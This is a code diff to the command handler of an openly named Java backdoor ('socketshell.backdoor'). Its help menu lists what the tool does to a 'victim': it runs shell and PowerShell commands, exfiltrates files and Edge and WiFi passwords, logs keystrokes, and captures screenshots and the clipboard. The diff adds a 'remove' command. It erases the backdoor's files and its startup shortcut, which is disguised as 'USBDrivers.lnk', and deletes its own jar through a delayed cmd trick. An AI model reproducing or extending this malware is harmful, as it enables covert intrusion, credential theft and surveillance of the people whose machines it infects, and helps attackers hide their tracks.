@@ -1,5 +1,6 @@
 package com.github.thatcherdev.socketshell.backdoor;
 
+import org.apache.commons.io.FileUtils;
 import java.awt.datatransfer.DataFlavor;
 import java.awt.Rectangle;
 import java.awt.Robot;
@@ -28,7 +29,8 @@ public class HandleCommand {
 			send = "[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
 					+ "[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
 					+ "[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
-					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer\n[cb] Get text currently copied to victim's clipboard\n[exit] Exit";
+					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer\n[cb] Get text currently copied to victim's clipboard\n"
+					+ "[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit";
 		else if (command.startsWith("cmd"))
 			send = Utils.runCommand(command.substring(4));
 		else if (command.startsWith("ps"))
@@ -96,7 +98,38 @@ public class HandleCommand {
 			} catch (Exception e) {
 				send = "An error occurred when trying to get victim's clipboard";
 			}
-		else if (!command.isEmpty())
+		else if (command.equals("remove")) {
+			try {
+				if (new File("gathered").exists())
+					FileUtils.forceDelete(new File("gathered"));
+				if (new File("jre").exists())
+					FileUtils.forceDelete(new File("jre"));
+				if (new File("scripts").exists())
+					FileUtils.forceDelete(new File("scripts"));
+
+				if (new File("USBDrivers.vbs").exists())
+					FileUtils.forceDelete(new File("USBDrivers.vbs"));
+				if (new File("C:\\Users\\" + System.getProperty("user.name")
+						+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk")
+								.exists())
+					FileUtils.forceDelete(new File("C:\\Users\\" + System.getProperty("user.name")
+							+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk"));
+				if (new File("USBDrivers.jar").exists())
+					Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del /f USBDrivers.jar");
+
+				if (new File("install.bat").exists())
+					FileUtils.forceDelete(new File("install.bat"));
+				if (new File("install.jar").exists())
+					FileUtils.forceDelete(new File("install.jar"));
+				if (new File("run.bat").exists())
+					FileUtils.forceDelete(new File("run.bat"));
+				if (new File("run.jar").exists())
+					Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del /f run.jar");
+				System.exit(0);
+			} catch (Exception e) {
+				send = "An error occurred when trying to remove files:\n" + e.getMessage();
+			}
+		} else if (!command.isEmpty())
 			send = "Command not found";
 		Backdoor.out.println(send + "\n!$end$!");
 	}
